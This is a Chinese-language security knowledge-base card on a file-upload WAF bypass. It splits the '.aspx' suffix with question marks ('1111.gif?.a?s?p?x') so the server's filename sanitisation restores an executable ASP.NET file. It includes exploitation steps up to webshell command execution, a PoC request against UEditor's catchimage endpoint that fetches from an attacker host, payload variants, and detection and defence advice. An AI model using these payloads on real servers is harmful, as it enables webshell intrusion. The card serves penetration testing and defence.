---
id: web-generic-file-upload-question-mark-filename-sanitize-waf-aspx-bypass
title: 后缀用 ? 拆分为 a?s?p?x 绕过 WAF 关键字，服务端清理非法字符后还原 .aspx
type: scenario
domain: web
path: web/generic/file-upload
technique: question-mark-filename-sanitize-suffix-bypass
tags:
- web
- file-upload
- waf-bypass
- filename
- aspx
- iis
- catchimage
- sanitization
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-V313
  verified_at: '2026-11-08T12:45:04+08:00'
  notes: 已对照原文与15张图核对：图04/05 直接 1111.gif?.aspx 被 Connection reset、图06 ?.a?s?p?x 放行且响应 url 以 .aspx 结尾、图13 访问后命令执行，支撑'? 拆分后缀绕过 WAF、后端清理 ? 后还原 .aspx'的结论；卡内已明确该还原机制为无源码推断并给出失效边界。与 multipart-duplicate-filename（重复 Content-Disposition）、fixed-length truncation（固定长度截断）等候选为 related，机制不同，非同链；dup-scan 与 14395 两卡 pair 均 related，保留双方。核对时已把 PoC Content-Length 57 修正为实际 body 长度 51。未验证点：原文字节级落盘机制未给源码、未复跑。
url: /docs/web/generic/file-upload/web-generic-file-upload-question-mark-filename-sanitize-waf-aspx-bypass/
draft: false
kb_aliases:
- 问号拆分后缀
- a?s?p?x 绕过
- WAF aspx 关键字绕过
- 文件名非法字符清理还原后缀
- 1111.gif?.a?s?p?x
---

## 一句话结论

当 WAF 只对原始请求字符串做 `.aspx` 关键字匹配，而目标端在保存文件名时会删掉 Windows 非法字符 `?` 时，把后缀写成 `?.a?s?p?x` 可以同时满足“WAF 看不到连续 aspx”和“落盘时 `?` 被移除、还原成 `.aspx`”，从而给上传/远程抓取类写入点落地可执行脚本。

## 原理

- **WAF 看到的是原始字符串**：上传文件名或远程抓取 URL 中的 `1111.gif?.aspx` 含有连续字面量 `aspx`，按关键字/正则匹配的 WAF 会直接命中并重置连接（原文用 Burp 发送时表现为 `Connection reset`）。
- **拆开关键字**：把后缀写成 `1111.gif?.a?s?p?x`。原始字符串里每个字母之间都插入了 `?`，不再出现连续的 `aspx`，WAF 的关键字匹配失效，请求被放行。
- **目标端会清理非法字符**：Windows 文件名不允许 `?`，服务端在把上传/抓取结果落盘时通常会过滤 `Path.GetInvalidFileNameChars()` 中的字符。移除所有 `?` 后：
  - `1111.gif?.a?s?p?x` → `1111.gif.aspx`
  - 最后的 `.a?s?p?x` 还原为 `.aspx`，文件变成 IIS 可执行的 ASP.NET 页面。
- **两个解析器不一致才是根因**：WAF 和后端对同一字符串做了不同的规范化——WAF 不做文件名清洗（或清洗规则不同），后端做了清洗。只要“清理后形成危险后缀”而“清理前不触发规则”，绕过即成立。
- **原文证据**：直接 `1111.gif?.aspx` 被 WAF 重置；改成 `1111.gif?.a?s?p?x` 后抓取请求放行，响应中落盘 `url` 以 `.aspx` 结尾，最终 webshell 可执行。攻击侧的 `python3 -m http.server` 日志显示收到 `GET /...gif?.a?s?p?x`，说明 `?` 在 HTTP 语义中是查询分隔符，并不影响服务端把整段字符串用于文件名处理。
- **推断边界**：原文未给出服务端源码，`?` 被移除并还原后缀是从响应 url 与执行结果推断的；不同框架/版本可能选择“拒绝含 `?` 的请求”或“把 `?` 之后当 query 丢弃”，此时本手法不成立，需要按响应路径实测。

## 触发条件

- WAF/网关对文件名、上传原始文件名或远程抓取 `source[]` 做字符串级后缀匹配，且未先按后端规则做规范化（未去除非文件名允许字符）。
- 后端保存逻辑会删除文件名中的 `?` 等非法字符，并用清理后的结果（含后缀）决定落盘名称。
- 落盘目录位于 Web 根下且允许脚本执行（IIS 的 `.aspx` 等）。
- 上传/写入点本身不重命名扩展名、不按白名单重建文件名；若后端强制随机名 + 白名单后缀，本手法无效。

## 利用步骤

1. 先发送含直白 `.aspx` 的请求，确认 WAF 行为（连接重置/拦截页）。
2. 把后缀改为被 `?` 拆分的等价形式，保证“删除 `?` 后”能拼回目标后缀，例如 `a?s?p?x`、`as?px`、`a?s?px`。
3. 完整文件名保持无害前缀 + 拆分后缀：`1111.gif?.a?s?p?x`，提交到上传点或远程抓取 `source[]`。
4. 检查响应中的落盘 url/文件名；若以 `.aspx` 结尾且可访问，则后缀层绕过成功。
5. 访问该路径验证脚本执行；若返回 404/文件消失，说明还有内容层查杀，需要继续做内容免杀。
6. 最终用 webshell 客户端连接并执行命令。

## PoC

```http
POST /Scripts/Ueditor/net/controller.ashx?action=catchimage HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded
Content-Length: 51

source%5B%5D=http://attacker:8080/1111.gif?.a?s?p?x
```

```text
# 后端清理 ? 后落盘名等价于：
1111.gif.aspx
# 响应 url 以 .aspx 结尾，访问可执行
```

```text
# 等价拆分变体（只要删除 ? 后为 aspx，且原文不含连续 aspx）：
1111.gif?.a?s?p?x
1111.gif?.as?px
1111.gif?.as?p?x
# 注意 . 的位置：1111.gif?a?s?p?x 删除 ? 后是 1111.gifaspx，不是 .aspx
```

## 变体与关联

- 变体：拆分字符不限于 `?`，任何“WAF 不匹配、后端保存时被删除”的非法文件名字符都可能达到同样效果（如某些控制字符、尾部点/空格），关键是比较两端的规范化差异。
- 变体：不依赖 `?` 拆字母，而是利用 `%00`/尾点/尾空格/双重扩展名等解析差异（参见 [[web-generic-file-upload-null-byte-path-truncation]]、[[web-generic-file-upload-move-uploaded-file-trailing-dot]]）。
- 关联：[[web-generic-file-upload-ueditor-net-catchimage-source-remote-write-aspx]]（本卡在原文中的使用场景：UEditor catchimage 远程抓取落盘）、[[web-generic-file-upload-multipart-duplicate-filename-waf-aspx-bypass]]（同一请求里给 WAF 和后端不同的文件名，属另一种前后端解析差异）、[[web-generic-file-upload-blacklist-double-write-bypass]]（过滤器删除关键字后还原后缀）。
- 边界：WAF 若先做与后端一致的规范化（去非法字符、解码、去重）再匹配，或后端拒绝含非法字符的文件名，本手法失效；后端强制白名单后缀/随机名时也不成立。

## 检测与防御

- 检测：请求的文件名/`source[]` 中出现被 `?`、控制字符等拆分的后缀片段（如 `a?s?p?x`），或路径与 query 拼接后能形成 `.aspx/.php/.jsp`。
- 检测：落盘文件名后缀与请求中原始后缀不一致；Web 目录短时间出现新的脚本文件且来源为上传/抓取接口。
- 防御：WAF 与后端使用同一套文件名规范化逻辑——先删除非法字符/解码，再按白名单校验最终扩展名。
- 防御：服务端不采用客户端/远程 URL 的文件名，统一随机命名并只允许白名单扩展；上传目录禁止脚本执行或移出 Web 根。
- 加固：对上传/抓取接口做内容魔数/图像解码校验；关闭不必要的远程抓取能力。
